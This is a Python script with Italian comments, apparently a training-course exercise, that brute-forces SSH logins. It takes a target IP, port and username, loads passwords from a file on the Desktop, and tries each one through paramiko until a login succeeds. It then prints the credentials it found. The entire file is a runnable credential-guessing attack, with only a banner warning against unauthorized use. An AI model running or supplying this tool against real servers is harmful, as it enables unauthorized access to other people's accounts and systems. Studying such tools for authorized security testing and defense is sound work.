# Importa le librerie necessarie
import paramiko   # Importa la libreria paramiko, necessaria per connettersi a un server SSH e gestire connessioni sicure
import time       # Importa la libreria time, usata per introdurre ritardi (es. time.sleep) durante i tentativi di connessione
import os         # Importa la libreria os, usata per interagire con il sistema operativo (es. per verificare l'esistenza di file)

# Dizionario con i codici ANSI per la colorazione del testo
COLORS = { # Definisce un dizionario chiamato COLORS che contiene codici ANSI per colorare il testo nel terminale
    'BOLD_AZZURRO': '\033[1;96m',  # Colore azzurro brillante (grassetto) per titoli e sezioni principali
    'AZZURRO': '\033[96m',         # Colore azzurro chiaro per testo informativo o decorativo
    'VIOLA': '\033[95m',           # Colore viola per evidenziare i tentativi di connessione
    'GIALLO': '\033[93m',          # Colore giallo per avvisi o istruzioni importanti
    'VERDE': '\033[92m',           # Colore verde per indicare successi (es. accesso riuscito)
    'ROSSO': '\033[91m',           # Colore rosso per errori o avvisi critici
    'BOLD': '\033[1m',             # Testo in grassetto
    'RESET': '\033[0m'             # Resetta i colori e gli stili
}

# Definisce una funzione chiamata mostra_introduzione che stampa l'introduzione del programma
def mostra_introduzione():
    print(f"""
    {COLORS['BOLD_AZZURRO']}
    ====================================================
    ███████╗██████╗ ██╗ ██████╗ ██████╗ ██████╗ ███████╗
    ██╔════╝██╔══██╗██║██╔════╝██╔═══██╗██╔══██╗██╔════╝
    █████╗  ██████╔╝██║██║     ██║   ██║██║  ██║█████╗  
    ██╔══╝  ██╔═══╝ ██║██║     ██║   ██║██║  ██║██╔══╝  
    ███████╗██║     ██║╚██████╗╚██████╔╝██████╔╝███████╗
    ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
    {COLORS['AZZURRO']}===================================================={COLORS['RESET']}
    {COLORS['BOLD']}Autore: Davide Mirani\n{COLORS['RESET']}
    {COLORS['VIOLA']}Tool per test di sicurezza SSH - Brute Force\n{COLORS['RESET']}
    {COLORS['GIALLO']}ISTRUZIONI:{COLORS['RESET']}
    - Inserisci l'indirizzo IP target.    
    - Specifica la porta SSH (premi Invio per usare la porta 22).
    - Fornisci il nome utente da testare.
    - Assicurati che il file 'passwords.txt' sia presente sul Desktop.\n    
    {COLORS['GIALLO']}ATTENZIONE:{COLORS['RESET']}
    {COLORS['ROSSO']}L'uso non autorizzato è illegale e vietato!{COLORS['RESET']}
    {COLORS['AZZURRO']}===================================================={COLORS['RESET']}
    """)

# Definisce una funzione ssh_bruteforce che esegue un attacco di forza bruta su un servizio SSH
def ssh_bruteforce(host, port, username, password_list, timeout=5):

    client = paramiko.SSHClient() # Crea un oggetto SSHClient per gestire la connessione SSH
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Aggiunge automaticamente nuove politiche per host sconosciuti

    # Itera sulla lista delle password, con un contatore i che parte da 1
    for i, password in enumerate(password_list, 1):

        password = password.strip()  # Rimuove spaziature accidentali

        # Inizia un blocco try per gestire eccezioni durante il tentativo di connessione
        try:
            # Stampa il tentativo corrente
            print(f"{COLORS['VIOLA']}▶ Tentativo {i}: {COLORS['BOLD']}{username}:{password}{COLORS['RESET']}")

            # Tenta di connettersi al server SSH con i parametri forniti
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=timeout
            )

            # Se la connessione riesce, stampa l'avvenuto successo
            print(f"\n{COLORS['VERDE']}{'#' * 60}")
            print(f"{COLORS['BOLD']}⚡ ACCESSO CONSENTITO! {COLORS['RESET']}")
            print(f"{COLORS['VERDE']}👤 Utente: {username}")
            print(f"🔑 Password: {password}")
            print(f"{'#' * 60}{COLORS['RESET']}\n")
            return password  # Restituisce la password trovata e termina la funzione

        # Gestione errore di autenticazione (password errata)
        except paramiko.AuthenticationException:
            print(f"{COLORS['ROSSO']}✖ Errore autenticazione{COLORS['RESET']}") # Stampa un messaggio di errore

        # Gestione errori specifici del protocollo SSH
        except paramiko.SSHException as e:
            print(f"{COLORS['GIALLO']}⚠ Errore SSH: {str(e)}{COLORS['RESET']}") # Stampa un messaggio di errore
            time.sleep(1)  # Aspetta 1 secondo per evitare blocchi o limitazioni del server.

        # Gestione di qualsiasi altra eccezione non prevista.
        except Exception as e:
            print(f"{COLORS['ROSSO']}☠ Errore critico: {str(e)}{COLORS['RESET']}") # Stampa un messaggio di errore

        finally: # Esegue questo blocco indipendentemente dal risultato del tentativo.
            # Chiude la connessione dopo ogni tentativo
            client.close()

    # Messaggio finale se nessuna password è stata trovata
    print(f"\n{COLORS['ROSSO']}🔍 Ricerca completata. Nessuna password valida trovata.{COLORS['RESET']}")
    return None # Restituisce None se non viene trovata nessuna password valida


if __name__ == "__main__": # Verifica se lo script viene eseguito direttamente
    mostra_introduzione()  # Chiama la funzione mostra_introduzione per stampare l'introduzione

    # Chiede all'utente l'indirizzo IP del server target e rimuove spazi
    target_host = input(f"{COLORS['AZZURRO']}🎯 Indirizzo IP target: {COLORS['RESET']}").strip()

    # Chiede all'utente la porta SSH, con valore predefinito 22, e rimuove spazi
    port_input = input(f"{COLORS['AZZURRO']}🔌 Porta SSH [22]: {COLORS['RESET']}").strip()

    # Converte la porta in intero, usa 22 se l'input è vuoto
    target_port = int(port_input) if port_input else 22

    # Chiede all'utente il nome utente e rimuove spazi
    username = input(f"{COLORS['AZZURRO']}👤 Nome utente: {COLORS['RESET']}").strip()

    # Definisce il percorso del file delle password (passwords.txt sul Desktop)
    password_file = os.path.expanduser("~/Desktop/passwords.txt")

    # Verifica se il file passwords.txt esiste
    if not os.path.isfile(password_file):
        # Stampa un messaggio di errore se il file non esiste
        print(f"\n{COLORS['ROSSO']}🗙 ERRORE: File {password_file} non trovato!{COLORS['RESET']}")
        exit(1)  # Termina il programma con codice di uscita 1 (errore)

    # Apre il file passwords.txt in modalità lettura
    with open(password_file, "r") as f:
        passwords = f.readlines() # Legge tutte le righe del file e le salva in una lista chiamata passwords

    # Verifica se la lista delle password è vuota
    if not passwords:
        # Stampa un messaggio di errore se il file è vuoto
        print(f"\n{COLORS['ROSSO']}🗙 ERRORE: Il file delle password è vuoto!{COLORS['RESET']}")
        exit(1) # Termina il programma con codice di uscita 1 (errore)

    # Stampa un messaggio di inizio attacco
    print(f"\n{COLORS['BOLD_AZZURRO']}⚔ Inizio attacco su {target_host}:{target_port}...{COLORS['RESET']}")
    # Esegue l'attacco di forza bruta e salva il risultato in found
    found = ssh_bruteforce(target_host, target_port, username, passwords)

    # Verifica se è stata trovata una password valida
    if found:
        # Stampa un messaggio di successo con le credenziali
        print(f"{COLORS['VERDE']}✅ Successo! Credenziali valide: {username}:{found}{COLORS['RESET']}")
    # Se non è stata trovata una password valida
    else:
        # Stampa un messaggio di fallimento
        print(f"{COLORS['ROSSO']}⛔ Nessuna credenziale valida trovata. Riprovare.{COLORS['RESET']}")